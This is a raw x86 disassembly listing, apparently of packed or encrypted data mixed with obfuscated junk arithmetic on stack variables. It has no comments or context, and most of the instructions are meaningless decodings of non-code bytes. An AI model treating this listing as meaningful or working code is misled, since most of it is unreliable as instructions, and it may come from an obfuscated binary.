  41b8ef:	sahf   
  41b8f0:	retf   
  41b8f1:	inc    ecx
  41b8f2:	mov    edi,0xf2c0e887
  41b8f7:	popf   
  41b8f8:	cdq    
  41b8f9:	pop    ebx
  41b8fa:	shl    BYTE PTR [ebp-0x20e26062],0xc9
  41b901:	es in  al,dx
  41b903:	xor    esi,DWORD PTR [ebx-0x7ec83271]
  41b909:	xor    al,0x73
  41b90b:	push   es
  41b90c:	dec    edx
  41b90d:	popa   
  41b90e:	mov    al,ds:0x728f9b3a
  41b913:	lahf   
  41b914:	sbb    eax,0x6972f338
  41b919:	add    dh,BYTE PTR [ecx]
  41b91b:	push   eax
  41b91c:	xor    DWORD PTR [edi],0xd401437a
  41b922:	xchg   edi,eax
  41b923:	sbb    al,0x79
  41b925:	inc    esp
  41b926:	jae    0x41b945
  41b928:	nop
  41b929:	es push edx
  41b92b:	mul    DWORD PTR [ebx-0x57]
  41b92e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b92f:	out    dx,eax
  41b930:	xor    DWORD PTR [eax-0x760b5cd1],edx
  41b936:	icebp  
  41b937:	jne    0x41b99e
  41b939:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b93a:	add    al,0xda
  41b93c:	jae    0x41b922
  41b93e:	jmp    0x9f4f:0x9bcfc481
  41b945:	mov    cl,BYTE PTR [eax-0x32]
  41b948:	xchg   esi,eax
  41b949:	dec    ecx
  41b94a:	ja     0x41b99e
  41b94c:	scas   al,BYTE PTR es:[edi]
  41b94d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b94e:	addr16 push 0xbc5f79d8
  41b954:	pop    edi
  41b955:	push   0xbc634b99
  41b95a:	outs   dx,DWORD PTR ds:[esi]
  41b95b:	or     al,0xbb
  41b95d:	sbb    DWORD PTR [esi],0xffffffc8
  41b960:	test   BYTE PTR [ebx],cl
  41b962:	adc    esi,0xe330e25b
  41b968:	lea    ebp,[ecx+0x3a]
  41b96b:	call   0xf247:0xa544debc
  41b972:	mov    dl,0xe3
  41b974:	fcmove st,st(7)
  41b976:	scas   al,BYTE PTR es:[edi]
  41b977:	out    dx,al
  41b978:	pop    ebx
  41b979:	(bad)  
  41b97a:	mov    dl,0x6
  41b97c:	sti    
  41b97d:	push   edi
  41b97e:	frstor [ebp+0x19]
  41b981:	imul   eax,DWORD PTR [ebp-0x76],0x932c0704
  41b988:	ds and ebp,eax
  41b98b:	pop    edi
  41b98c:	inc    ebp
  41b98d:	nop
  41b98e:	jge    0x41b97b
  41b990:	jge    0x41b9f0
  41b992:	cdq    
  41b993:	xchg   ebx,eax
  41b994:	ror    BYTE PTR [edx+0x2697218c],0xb3
  41b99b:	sub    al,0x1e
  41b99d:	stos   BYTE PTR es:[edi],al
  41b99e:	sbb    esp,DWORD PTR [eax]
  41b9a0:	jge    0x41b9db
  41b9a2:	or     DWORD PTR [eax-0x5638d6bd],ebx
  41b9a8:	stos   DWORD PTR es:[edi],eax
  41b9a9:	icebp  
  41b9aa:	shl    BYTE PTR [edi-0x3f2e146a],1
  41b9b0:	push   cs
  41b9b1:	retf   
  41b9b2:	sbb    eax,0xa72b73b1
  41b9b7:	inc    ebx
  41b9b8:	mov    ecx,0xd63ebf37
  41b9bd:	iret   
  41b9be:	mov    ecx,0x8fc716b3
  41b9c3:	jb     0x41b9af
  41b9c5:	jnp    0x41ba20
  41b9c7:	loopne 0x41b9a8
  41b9c9:	fstp   QWORD PTR [ebx+0x48]
  41b9cc:	stos   DWORD PTR es:[edi],eax
  41b9cd:	push   0xb
  41b9cf:	sahf   
  41b9d0:	js     0x41b9c2
  41b9d2:	rcl    BYTE PTR [ecx],cl
  41b9d4:	test   DWORD PTR [ebx],0x4f5f57e2
  41b9da:	add    BYTE PTR [ebp*2-0x2038fcc7],ah
  41b9e1:	sar    DWORD PTR [edi],1
  41b9e3:	(bad)  
  41b9e4:	jns    0x41ba36
  41b9e6:	gs fs inc ebp
  41b9e9:	into   
  41b9ea:	mov    fs,WORD PTR [edi-0x32214e2e]
  41b9f0:	xchg   DWORD PTR [edi+0x56700c6b],esi
  41b9f6:	js     0x41ba1b
  41b9f8:	inc    edx
  41b9f9:	shr    bh,0x50
  41b9fc:	jns    0x41b98f
  41b9fe:	dec    edi
  41b9ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ba00:	jb     0x41ba22
  41ba02:	and    ebx,0xfffffff3
  41ba05:	outs   dx,BYTE PTR ds:[esi]
  41ba06:	dec    ebp
  41ba07:	mov    ds:0x67e07d01,al
  41ba0c:	mov    cl,0x88
  41ba0e:	sbb    ebp,DWORD PTR ds:0xc7d5f696
  41ba14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ba15:	and    BYTE PTR [edi+edx*1],cl
  41ba18:	and    eax,DWORD PTR [bx+0x1e]
  41ba1c:	push   ss
  41ba1d:	dec    eax
  41ba1e:	xchg   esp,eax
  41ba1f:	mov    ch,0xe7
  41ba21:	xlat   BYTE PTR ds:[ebx]
  41ba22:	xor    eax,0x29178bc
  41ba27:	sub    eax,eax
  41ba29:	inc    esp
  41ba2a:	xchg   DWORD PTR [ebp-0x54],ebx
  41ba2d:	add    al,0xc1
  41ba2f:	repnz or al,0xb5
  41ba32:	dec    edx
  41ba33:	out    0x61,al
  41ba35:	js     0x41ba7b
  41ba37:	inc    edi
  41ba38:	aam    0x50
  41ba3a:	mov    eax,0x285778fd
  41ba3f:	push   edi
  41ba40:	cmp    BYTE PTR [esi+0x2b92cd04],0xdb
  41ba47:	cmc    
  41ba48:	jbe    0x41ba28
  41ba4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba4b:	xchg   ecx,eax
  41ba4c:	cmp    eax,0xf5f579bd
  41ba51:	imul   ecx,DWORD PTR [edi+0x3e],0xffffff85
  41ba55:	or     ebx,DWORD PTR [eax-0x70]
  41ba58:	js     0x41bab1
  41ba5a:	cwde   
  41ba5b:	adc    bl,BYTE PTR ds:0x5417ed6b
  41ba61:	out    0xb3,al
  41ba63:	ficom  DWORD PTR [edi]
  41ba65:	lock add eax,0xa17f819d
  41ba6b:	mov    esp,0x81ef442b
  41ba70:	fcomp  DWORD PTR [eax-0xe]
  41ba73:	mov    gs,edi
  41ba75:	cmp    edx,DWORD PTR [ebx-0x43]
  41ba78:	fnstcw WORD PTR [ebx+0x979e3d2]
  41ba7e:	pop    esi
  41ba7f:	out    dx,eax
  41ba80:	sub    dh,BYTE PTR [edi+0x3b8708d]
  41ba86:	or     edx,DWORD PTR [ebp+edx*8-0x4b4e5fb3]
  41ba8d:	js     0x41bac5
  41ba8f:	cmp    ebp,DWORD PTR [ebp+0x3d]
  41ba92:	cmp    DWORD PTR [edx-0x3c],edx
  41ba95:	mov    ds:0x2121a1f1,eax
  41ba9a:	cmp    BYTE PTR [ebp+eiz*4+0xa],cl
  41ba9e:	pop    ss
  41ba9f:	mov    cl,0x57
  41baa1:	aas    
  41baa2:	cdq    
  41baa3:	mov    WORD PTR [edx+0x5a5f6c04],ss
  41baa9:	jmp    DWORD PTR [ebx+0x7ccbd0dc]
  41baaf:	xor    bh,BYTE PTR [ecx]
  41bab1:	ins    DWORD PTR es:[edi],dx
  41bab2:	scas   al,BYTE PTR es:[edi]
  41bab3:	in     al,0x9e
  41bab5:	mov    bh,0x38
  41bab7:	mov    cl,0xb2
  41bab9:	dec    ebx
  41baba:	mov    es,WORD PTR [edx]
  41babc:	(bad)  
  41babd:	fdiv   st(7),st
  41babf:	jbe    0x41bb00
  41bac1:	xchg   esi,eax
  41bac2:	jg     0x41bab7
  41bac4:	out    0xec,eax
  41bac6:	mov    dl,0xdc
  41bac8:	bswap  ebp
  41baca:	sbb    DWORD PTR [edi],esi
  41bacc:	xor    DWORD PTR [esi],0xffffffd8
  41bacf:	jbe    0x41ba7c
  41bad1:	and    DWORD PTR [esi+0x4c7d8217],esi
  41bad7:	in     al,0x4a
  41bad9:	sbb    BYTE PTR [ebx+0x73c7f1be],bl
  41badf:	push   ebx
  41bae0:	mov    dh,0xfd
  41bae2:	repz and ah,BYTE PTR [ebx+0x2c]
  41bae6:	jecxz  0x41bb12
  41bae8:	sub    esi,ebp
  41baea:	push   ss
  41baeb:	and    esi,DWORD PTR [edx]
  41baed:	push   es
  41baee:	push   ss
  41baef:	(bad)  
  41baf0:	popf   
  41baf1:	mov    eax,DWORD PTR [edx]
  41baf3:	and    al,0x6a
  41baf5:	and    al,0xe2
  41baf7:	jns    0x41baa2
  41baf9:	push   eax
  41bafa:	sahf   
  41bafb:	(bad)  
  41bafc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bafd:	mov    ds:0x24d6daed,al
  41bb02:	dec    ebp
  41bb03:	jne    0x41bb11
  41bb05:	and    cl,BYTE PTR [edx+edx*1+0x1e]
  41bb09:	imul   ebp,DWORD PTR [ebx],0x74
  41bb0c:	sbb    ch,BYTE PTR [eax-0x5e]
  41bb0f:	rcl    esi,cl
  41bb11:	ret    
  41bb12:	test   eax,0xa1ef5055
  41bb17:	inc    ebp
  41bb18:	mov    al,0x34
  41bb1a:	mov    eax,0xa15a8bd9
  41bb1f:	(bad)  
  41bb20:	or     al,0x59
  41bb22:	push   0xf758b8fb
  41bb27:	pop    ebx
  41bb28:	xchg   BYTE PTR [esi],bh
  41bb2a:	push   ebx
  41bb2b:	(bad)  
  41bb2c:	test   DWORD PTR [eax+0x24964fca],0xae8b3d47
  41bb36:	es and eax,0x9a7551a6
  41bb3c:	mov    ds:0xa3375489,al
  41bb41:	xlat   BYTE PTR ds:[ebx]
  41bb42:	fstp   DWORD PTR ds:0x27e6ffeb
  41bb48:	mov    al,ds:0xa1428c11
  41bb4d:	fmul   st,st(6)
  41bb4f:	sti    
  41bb50:	jg     0x41baec
  41bb52:	jle    0x41bb09
  41bb54:	icebp  
  41bb55:	sub    DWORD PTR [eax+0xb],edi
  41bb58:	or     DWORD PTR [edi-0x1d2827df],esi
  41bb5e:	and    edx,esi
  41bb60:	es xor dl,al
  41bb63:	xor    BYTE PTR [esi],ch
  41bb65:	jo     0x41bb4b
  41bb67:	sub    cl,bh
  41bb69:	idiv   ebp
  41bb6b:	add    eax,0xbd1b33d8
  41bb70:	(bad)  [edx-0x2bd28b53]
  41bb76:	lock sbb DWORD PTR [ecx-0x6e],ebx
  41bb7a:	mov    BYTE PTR [ebp+0x75],dh
  41bb7d:	repnz pop ebx
  41bb7f:	add    esp,DWORD PTR [edi-0x11]
  41bb82:	div    BYTE PTR [edx]
  41bb84:	hlt    
  41bb85:	push   ebx
  41bb86:	(bad)  
  41bb87:	xchg   ebp,eax
  41bb88:	aad    0x9c
  41bb8a:	add    eax,0xc7bd1fe4
  41bb8f:	je     0x41bbd5
  41bb91:	ins    DWORD PTR es:[edi],dx
  41bb92:	jne    0x41bb4c
  41bb94:	shl    DWORD PTR [esi+ecx*1+0x20034411],0x39
  41bb9c:	ss sub al,dl
  41bb9f:	mov    bh,0xc5
  41bba1:	into   
  41bba2:	add    ecx,DWORD PTR [esi]
  41bba4:	lods   al,BYTE PTR ds:[esi]
  41bba5:	in     eax,0x1f
  41bba7:	aaa    
  41bba8:	dec    eax
  41bba9:	cmp    bl,BYTE PTR [edx-0x28]
  41bbac:	or     ecx,ebx
  41bbae:	xchg   ebp,eax
  41bbaf:	(bad)  
  41bbb0:	push   esp
  41bbb1:	addr16 (bad) 
  41bbb4:	repz jmp 0x41bc14
  41bbb7:	dec    esp
  41bbb8:	bound  edi,QWORD PTR [edx-0x55]
  41bbbb:	pusha  
  41bbbc:	stos   DWORD PTR es:[edi],eax
  41bbbd:	inc    ecx
  41bbbe:	fnstenv [ebp-0x49538ba0]
  41bbc4:	sub    DWORD PTR [esi-0x1ed46448],ebx
  41bbca:	pop    edi
  41bbcb:	push   ebx
  41bbcc:	stos   DWORD PTR es:[edi],eax
  41bbcd:	repz cmp BYTE PTR [edx],0x36
  41bbd1:	xchg   esp,eax
  41bbd2:	and    cx,dx
  41bbd5:	mov    dx,WORD PTR [esp+0x24]
  41bbda:	or     cx,dx
  41bbdd:	mov    dx,WORD PTR [esp+0x2c]
  41bbe2:	add    cx,dx
  41bbe5:	or     ecx,0x3b22
  41bbeb:	mov    WORD PTR [esp+0x3c],cx
  41bbf0:	jmp    0x41bfbf
  41bbf5:	inc    edx
  41bbf6:	pop    edx
  41bbf7:	push   ecx
  41bbf8:	fwait
  41bbf9:	xor    DWORD PTR [edx+0x237b5a22],ebx
  41bbff:	pop    ecx
  41bc00:	stos   BYTE PTR es:[edi],al
  41bc01:	idiv   DWORD PTR [eax-0x7efc4329]
  41bc07:	push   ss
  41bc08:	sbb    BYTE PTR [edx+edx*1+0x61481818],bh
  41bc0f:	sbb    ecx,esp
  41bc11:	mov    ebx,0x2152fc7b
  41bc16:	bound  edi,QWORD PTR es:[eax+ecx*2-0x40]
  41bc1b:	out    0xca,al
  41bc1d:	in     eax,0x1c
  41bc1f:	push   0x31
  41bc21:	or     ebp,DWORD PTR [esi+0x4c]
  41bc24:	ins    DWORD PTR es:[edi],dx
  41bc25:	scas   al,BYTE PTR es:[edi]
  41bc26:	adc    DWORD PTR [edx+edx*1-0x6fb42db2],esi
  41bc2d:	push   edi
  41bc2e:	mov    eax,0x1bf5648b
  41bc33:	xchg   ebp,eax
  41bc34:	xor    ebx,DWORD PTR [ecx+0x1a]
  41bc37:	lods   al,BYTE PTR ds:[esi]
  41bc38:	scas   eax,DWORD PTR es:[edi]
  41bc39:	arpl   WORD PTR [eax-0x26],sp
  41bc3c:	sbb    bl,BYTE PTR [edx+esi*8+0x53]
  41bc40:	dec    esp
  41bc41:	or     eax,DWORD PTR [ebx]
  41bc43:	inc    edi
  41bc44:	push   edx
  41bc45:	cmp    edx,DWORD PTR [ebx]
  41bc47:	daa    
  41bc48:	sbb    BYTE PTR [edx-0x60],al
  41bc4b:	add    DWORD PTR [edx],0xffffff94
  41bc4e:	scas   eax,DWORD PTR es:[edi]
  41bc4f:	sbb    BYTE PTR [eax+0x55],dh
  41bc52:	shl    BYTE PTR [esi+0xe],1
  41bc55:	cmp    eax,esp
  41bc57:	xchg   ebx,eax
  41bc58:	sbb    al,0xc
  41bc5a:	dec    edx
  41bc5b:	or     DWORD PTR [ebx],0xb8bc0da2
  41bc61:	mov    eax,0xc5682aa9
  41bc66:	jne    0x41bc28
  41bc68:	pop    ds
  41bc69:	dec    ebx
  41bc6a:	lahf   
  41bc6b:	popa   
  41bc6c:	in     eax,dx
  41bc6d:	push   eax
  41bc6e:	aam    0xbe
  41bc70:	int    0xa
  41bc72:	inc    eax
  41bc73:	(bad)  
  41bc74:	repz jae 0x41bc12
  41bc77:	adc    al,0x8a
  41bc79:	xchg   BYTE PTR [ecx+ebx*8],ch
  41bc7c:	sub    eax,0x1478c4c
  41bc81:	inc    ecx
  41bc82:	sbb    edi,DWORD PTR [ecx]
  41bc84:	lock mov edi,0x8b6acfc9
  41bc8a:	inc    esi
  41bc8b:	jno    0x41bc6a
  41bc8d:	xchg   DWORD PTR [esi+edi*2-0x29],esi
  41bc91:	idiv   BYTE PTR [esi]
  41bc93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bc94:	mov    ah,BYTE PTR ds:0xd572b7f9
  41bc9a:	fst    QWORD PTR [ecx-0x17cb6fe3]
  41bca0:	mov    bh,0x19
  41bca2:	push   edx
  41bca3:	cmp    eax,0x597bac5
  41bca8:	(bad)  
  41bca9:	jmp    0x41bcbc
  41bcab:	or     BYTE PTR [edi],al
  41bcad:	or     eax,0x3d2a8a20
  41bcb2:	dec    edi
  41bcb3:	inc    edx
  41bcb4:	cmp    DWORD PTR [esi+0x410f2ca5],ebp
  41bcba:	ret    
  41bcbb:	dec    esp
  41bcbc:	inc    edx
  41bcbd:	popa   
  41bcbe:	mov    ch,0x52
  41bcc0:	pop    ebx
  41bcc1:	mov    eax,ds:0x5de766a0
  41bcc6:	mov    eax,0x187689dd
  41bccb:	jp     0x41bd2a
  41bccd:	pop    ds
  41bcce:	ss pop ebx
  41bcd0:	in     al,dx
  41bcd1:	pop    es
  41bcd2:	popa   
  41bcd3:	ror    WORD PTR [ecx],1
  41bcd6:	sub    DWORD PTR [ebp-0x79],ecx
  41bcd9:	js     0x41bd0d
  41bcdb:	test   al,0x86
  41bcdd:	sbb    al,0xe8
  41bcdf:	dec    ebp
  41bce0:	paddb  mm3,mm3
  41bce3:	xor    al,0xef
  41bce5:	cld    
  41bce6:	clc    
  41bce7:	pushf  
  41bce8:	dec    eax
  41bce9:	out    dx,eax
  41bcea:	push   DWORD PTR [eax-0x46a8f875]
  41bcf0:	outs   dx,DWORD PTR ds:[esi]
  41bcf1:	and    al,ch
  41bcf3:	fld    DWORD PTR [edx-0x2de71c52]
  41bcf9:	iret   
  41bcfa:	mov    al,0x80
  41bcfc:	stc    
  41bcfd:	add    BYTE PTR [ebp+0x3f8a44c7],dh
  41bd03:	ja     0x41bcb0
  41bd05:	repz pushf 
  41bd07:	mov    ds,WORD PTR ds:0x85920d5b
  41bd0d:	imul   ebp,DWORD PTR [esp+edx*8],0xe4caff5d
  41bd14:	xchg   ebp,eax
  41bd15:	and    al,0xbe
  41bd17:	mov    eax,0x22f725ba
  41bd1c:	stos   BYTE PTR es:[edi],al
  41bd1d:	dec    edx
  41bd1e:	fcom   DWORD PTR [eax+0x615bb4c0]
  41bd24:	out    dx,al
  41bd25:	fstp   TBYTE PTR [ebx-0x2d]
  41bd28:	stos   BYTE PTR es:[edi],al
  41bd29:	mov    edx,0x51ae97bb
  41bd2e:	call   0x8b32a70c
  41bd33:	lds    ebp,FWORD PTR [edi-0x59]
  41bd36:	and    ebx,esi
  41bd38:	sub    BYTE PTR [ebp+0x8],ch
  41bd3b:	add    ebp,ecx
  41bd3d:	add    bl,BYTE PTR [edx-0x1b]
  41bd40:	aas    
  41bd41:	inc    eax
  41bd42:	sbb    eax,edx
  41bd44:	mov    edx,0xccc2c24a
  41bd49:	dec    esi
  41bd4a:	xor    ebx,DWORD PTR [edx]
  41bd4c:	cmp    eax,0xe1911259
  41bd51:	cmc    
  41bd52:	push   ss
  41bd53:	mov    al,0x11
  41bd55:	out    dx,al
  41bd56:	cli    
  41bd57:	xchg   ebp,eax
  41bd58:	add    bl,al
  41bd5a:	out    dx,eax
  41bd5b:	ins    DWORD PTR es:[edi],dx
  41bd5c:	adc    ch,BYTE PTR [edx-0x5]
  41bd5f:	pop    DWORD PTR [ebx+0x63]
  41bd62:	push   ecx
  41bd63:	dec    edx
  41bd64:	icebp  
  41bd65:	or     eax,0x298fa513
  41bd6a:	test   bl,al
  41bd6c:	arpl   WORD PTR [edi],bx
  41bd6e:	cli    
  41bd6f:	dec    edx
  41bd70:	ror    bl,cl
  41bd72:	popa   
  41bd73:	test   eax,0x7010b77e
  41bd78:	inc    esi
  41bd79:	cli    
  41bd7a:	int3   
  41bd7b:	in     eax,0x64
  41bd7d:	adc    ch,dl
  41bd7f:	xchg   esi,eax
  41bd80:	cmp    ecx,ecx
  41bd82:	jmp    0x391b:0x75411116
  41bd89:	in     eax,0x2d
  41bd8b:	push   cs
  41bd8c:	sub    eax,0x5d3c4052
  41bd91:	fstp   st(7)
  41bd93:	loop   0x41bd22
  41bd95:	aas    
  41bd96:	hlt    
  41bd97:	add    eax,0x92be1fd6
  41bd9c:	xchg   edi,eax
  41bd9d:	mov    bh,0x2b
  41bd9f:	push   edi
  41bda0:	pop    ebx
  41bda1:	es pop esp
  41bda3:	rol    al,cl
  41bda5:	dec    ecx
  41bda6:	shl    DWORD PTR [ebp+esi*2+0x41],1
  41bdaa:	rol    cl,1
  41bdac:	pop    edi
  41bdad:	les    esp,FWORD PTR ds:0xf14ad25c
  41bdb3:	aas    
  41bdb4:	mov    ebp,0x2f7cbd02
  41bdb9:	stc    
  41bdba:	sbb    al,BYTE PTR [ecx+0x31]
  41bdbd:	and    al,0xde
  41bdbf:	or     BYTE PTR ds:0xd0281def,cl
  41bdc5:	push   ebx
  41bdc6:	out    0xb1,al
  41bdc8:	rcl    BYTE PTR [ebx-0x6b2e3534],1
  41bdce:	adc    BYTE PTR [edi+0x1],cl
  41bdd1:	adc    eax,0xe4973f48
  41bdd6:	aas    
  41bdd7:	nop
  41bdd8:	sub    DWORD PTR [ecx],edi
  41bdda:	push   eax
  41bddb:	mov    bh,0xbd
  41bddd:	mov    ecx,eax
  41bddf:	mov    ecx,0xbaabfffd
  41bde4:	fnop   
  41bde6:	push   0x94a6f2d3
  41bdeb:	ret    
  41bdec:	sub    al,0xf
  41bdee:	test   eax,ebx
  41bdf0:	shl    DWORD PTR [ecx],0x6d
  41bdf3:	mov    bh,0x6
  41bdf5:	inc    ebp
  41bdf6:	sbb    eax,0xe5436853
  41bdfb:	mov    edi,eax
  41bdfd:	shl    DWORD PTR [edx-0x5b],0x2d
  41be01:	or     edi,DWORD PTR [ecx]
  41be03:	out    dx,eax
  41be04:	jle    0x41be6e
  41be06:	ja     0x41be66
  41be08:	mov    al,ds:0x61c97120
  41be0d:	data16 mov ah,0x94
  41be10:	mov    eax,ds:0x759a59cf
  41be15:	jge    0x41be87
  41be17:	sub    BYTE PTR [ebp+0x601a5c28],bh
  41be1d:	pop    edx
  41be1e:	(bad)
  41be21:	loope  0x41be6e
  41be23:	aaa    
  41be24:	sbb    BYTE PTR [ebx-0x1b0c633d],dh
  41be2a:	fwait
  41be2b:	sbb    bh,BYTE PTR [ecx+0x39d87e80]
  41be31:	in     al,dx
  41be32:	jp     0x41be6e
  41be34:	cmc    
  41be35:	je     0x41be5f
  41be37:	pop    es
  41be38:	add    al,0x95
  41be3a:	jmp    0x9258:0xd61bd18e
  41be41:	in     eax,0x97
  41be43:	jno    0x41be0b
  41be45:	jl     0x41be75
  41be47:	push   ds
  41be48:	jae    0x41be22
  41be4a:	xor    DWORD PTR [ecx+eax*4+0x4cf28a71],esp
  41be51:	(bad)  
  41be53:	mov    edx,0x911d7d26
  41be58:	pavgw  mm2,QWORD PTR [ecx-0x3b]
  41be5c:	adc    DWORD PTR [esp+ebp*1],ebp
  41be5f:	ins    DWORD PTR es:[edi],dx
  41be60:	push   cs
  41be61:	push   ebp
  41be62:	push   0xffffffb0
  41be64:	data16 je 0x41bea0
  41be67:	pop    eax
  41be68:	repnz adc DWORD PTR [edi-0x5a],0x49
  41be6d:	iret   
  41be6e:	fcomp  st(2)
  41be70:	push   ds
  41be71:	pop    edx
  41be72:	popf   
  41be73:	int    0x48
  41be75:	cld    
  41be76:	jns    0x41be9f
  41be78:	stc    
  41be79:	dec    ebp
  41be7a:	jno    0x41be41
  41be7c:	pop    es
  41be7d:	sub    edx,ebp
  41be7f:	(bad)  
  41be80:	das    
  41be81:	sbb    DWORD PTR [ebp+ebx*8-0x68],eax
  41be85:	xchg   ebx,eax
  41be86:	jle    0x41be9c
  41be88:	jecxz  0x41becd
  41be8a:	mov    dh,0x2c
  41be8c:	sbb    esi,DWORD PTR [ebx]
  41be8e:	ret    0xdbb8
  41be91:	mov    dh,0xde
  41be93:	adc    ch,al
  41be95:	xchg   esp,eax
  41be96:	into   
  41be97:	cli    
  41be98:	in     al,dx
  41be99:	add    ch,BYTE PTR [edi+ecx*8-0x34b765f5]
  41bea0:	add    al,0x2
  41bea2:	repnz (bad) 
  41bea5:	add    al,BYTE PTR [esi-0x5b]
  41bea8:	fst    QWORD PTR [ebx+edx*4+0x6588084d]
  41beaf:	and    DWORD PTR es:[esi+0x2c4edd24],0xe169dd13
  41beba:	xchg   esi,eax
  41bebb:	cmovae ebx,DWORD PTR [ebx+ebx*4+0x3e]
  41bec0:	dec    edi
  41bec1:	adc    al,0x31
  41bec3:	es scas al,BYTE PTR es:[edi]
  41bec5:	sar    eax,1
  41bec7:	mov    ah,0x52
  41bec9:	aaa    
  41beca:	jl     0x41bf19
  41becc:	(bad)  
  41becd:	in     eax,0x8d
  41becf:	or     ebp,edi
  41bed1:	mov    bl,0xdd
  41bed3:	sub    DWORD PTR [esi+0x2c48f11c],0x1a1a7e71
  41bedd:	mov    eax,ds:0xca1cefa1
  41bee2:	mov    ah,0x86
  41bee4:	and    al,0x1a
  41bee6:	add    edx,DWORD PTR [ebp-0x20]
  41bee9:	sub    DWORD PTR [eax],esi
  41beeb:	pusha  
  41beec:	and    cl,cl
  41beee:	jno    0x41bf6a
  41bef0:	aam    0x13
  41bef2:	cmp    eax,0x15526fc1
  41bef7:	pop    es
  41bef8:	or     al,0x26
  41befa:	iret   
  41befb:	retf   
  41befc:	sbb    al,BYTE PTR [edx+0x69]
  41beff:	(bad)  
  41bf00:	das    
  41bf01:	nop
  41bf02:	pushf  
  41bf03:	fsub   st,st(5)
  41bf05:	mov    eax,ds:0x1f6353e2
  41bf0a:	mov    edx,0x1487ce23
  41bf0f:	mov    ah,0x35
  41bf11:	mov    al,ds:0x7a2a4b78
  41bf16:	aaa    
  41bf17:	or     BYTE PTR [esi+edi*1],al
  41bf1a:	mov    dl,0xba
  41bf1c:	add    edx,edi
  41bf1e:	scas   eax,DWORD PTR es:[edi]
  41bf1f:	stos   DWORD PTR es:[edi],eax
  41bf20:	mov    ebx,0x469aef37
  41bf25:	lea    esi,[esi+0x49588ba7]
  41bf2b:	ror    DWORD PTR [eax+ebp*1-0x5a],1
  41bf2f:	and    ebx,DWORD PTR [edx-0x2c]
  41bf32:	mov    WORD PTR [eax+0x13584101],ds
  41bf38:	retf   0xbd62
  41bf3b:	popf   
  41bf3c:	inc    ebx
  41bf3d:	cmp    al,0xbc
  41bf3f:	scas   al,BYTE PTR es:[edi]
  41bf40:	adc    eax,0xd99208e2
  41bf45:	push   ebx
  41bf46:	int3   
  41bf47:	je     0x41bfbe
  41bf49:	iret   
  41bf4a:	inc    ecx
  41bf4b:	lods   al,BYTE PTR ds:[esi]
  41bf4c:	push   ebp
  41bf4d:	jns    0x41bf9a
  41bf4f:	out    0x29,eax
  41bf51:	out    0x9b,eax
  41bf53:	dec    esp
  41bf54:	stc    
  41bf55:	mov    bl,0x11
  41bf57:	pop    ds
  41bf58:	(bad)  
  41bf59:	sar    DWORD PTR [ebx-0x31],1
  41bf5c:	ror    BYTE PTR [eax],cl
  41bf5e:	cmp    ebx,ebx
  41bf60:	fiadd  DWORD PTR [ebp-0x7c]
  41bf63:	ficomp DWORD PTR [edi+ebp*2+0x751e3bee]
  41bf6a:	inc    eax
  41bf6b:	fwait
  41bf6c:	iret   
  41bf6d:	mov    dh,0x95
  41bf6f:	cmp    al,BYTE PTR [esi+0x75]
  41bf72:	sub    DWORD PTR [ebx],0x23
  41bf75:	push   edi
  41bf76:	lods   al,BYTE PTR ds:[esi]
  41bf77:	pop    edi
  41bf78:	sub    BYTE PTR [esi],cl
  41bf7a:	cmp    edi,DWORD PTR [esp+edx*8]
  41bf7d:	outs   dx,DWORD PTR ds:[esi]
  41bf7e:	cdq    
  41bf7f:	inc    edx
  41bf80:	scas   eax,DWORD PTR es:[edi]
  41bf81:	mov    ecx,DWORD PTR [edi+eiz*2]
  41bf84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bf85:	mov    ebx,0x6a866cc0
  41bf8a:	jg     0x41bfc1
  41bf8c:	jmp    0xa2d7:0xcd7c7a99
  41bf93:	or     DWORD PTR [edx+0xf],esi
  41bf96:	or     DWORD PTR [ebx-0x3e131c95],ecx
  41bf9c:	test   al,0x5e
  41bf9e:	xor    eax,0xf1c6543f
  41bfa3:	push   eax
  41bfa4:	jb     0x41bfac
  41bfa6:	dec    edx
  41bfa7:	pop    esp
  41bfa8:	cmp    eax,0x496978d7
  41bfad:	pop    esi
  41bfae:	shr    al,1
  41bfb0:	sahf   
  41bfb1:	inc    ebx
  41bfb2:	cdq    
  41bfb3:	imul   eax,DWORD PTR [ebp-0x33822019],0xffffff88
  41bfba:	jecxz  0x41bfa4
  41bfbc:	push   ecx
  41bfbd:	push   0x57d4b9c1
  41bfc2:	add    BYTE PTR [eax],al
  41bfc4:	mov    WORD PTR [esp+0x2c],cx
  41bfc9:	mov    ecx,0x3b21
  41bfce:	mov    WORD PTR [esp+0x38],cx
  41bfd3:	mov    ecx,0x52fd
  41bfd8:	mov    WORD PTR [esp+0x24],cx
  41bfdd:	mov    ecx,0x2ce0
  41bfe2:	mov    WORD PTR [esp+0xc],cx
  41bfe7:	mov    cx,WORD PTR [esp+0xc]
  41bfec:	mov    dx,WORD PTR [esp+0x24]
  41bff1:	or     cx,dx
  41bff4:	mov    edx,0x21a4
  41bff9:	or     cx,dx
  41bffc:	mov    dx,WORD PTR [esp+0x2c]
  41c001:	sub    cx,dx
  41c004:	mov    dx,WORD PTR [esp+0x38]
  41c009:	sub    cx,dx
  41c00c:	mov    dx,WORD PTR [esp+0x3c]
  41c011:	cmp    dx,cx
  41c014:	jbe    0x41c888
  41c01a:	mov    ecx,0x5008
  41c01f:	mov    WORD PTR [esp+0x24],cx
  41c024:	mov    ecx,0x60ce
  41c029:	mov    WORD PTR [esp+0xc],cx
  41c02e:	movzx  ecx,WORD PTR [esp+0xc]
  41c033:	mov    edx,0x2095
  41c038:	or     cx,dx
  41c03b:	mov    dx,WORD PTR [esp+0x24]
  41c040:	sub    cx,dx
  41c043:	mov    edx,0x10de
  41c048:	or     ecx,0x742f
  41c04e:	imul   ecx,ecx,0x30b2
  41c054:	mov    WORD PTR [esp+0x3c],cx
  41c059:	mov    ecx,0x6143
  41c05e:	mov    WORD PTR [esp+0x38],cx
  41c063:	mov    ecx,0x679f
  41c068:	mov    WORD PTR [esp+0x2c],cx
  41c06d:	mov    ecx,0x1210
  41c072:	mov    WORD PTR [esp+0x24],cx
  41c077:	mov    ecx,0x3308
